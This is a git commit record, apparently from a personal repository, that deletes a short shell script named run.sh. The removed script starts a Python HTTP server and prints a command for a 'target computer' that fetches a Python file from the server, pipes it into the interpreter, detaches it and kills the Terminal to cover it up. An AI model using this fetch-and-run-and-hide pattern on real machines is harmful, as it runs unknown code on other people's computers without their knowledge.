19c6417a2ec9f46ffc88bf8a0cdf436cb61a405d
leftside97 <chrswr97@gmail.com>
2022-05-28 17:29:47 +0200

    Delete run.sh

--- run.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/sh
-
-IP="<IP>"
-PORT="8080"
-echo "run on target computer:"
-echo "curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal"
-echo ""
-/bin/python3 -m http.server $PORT
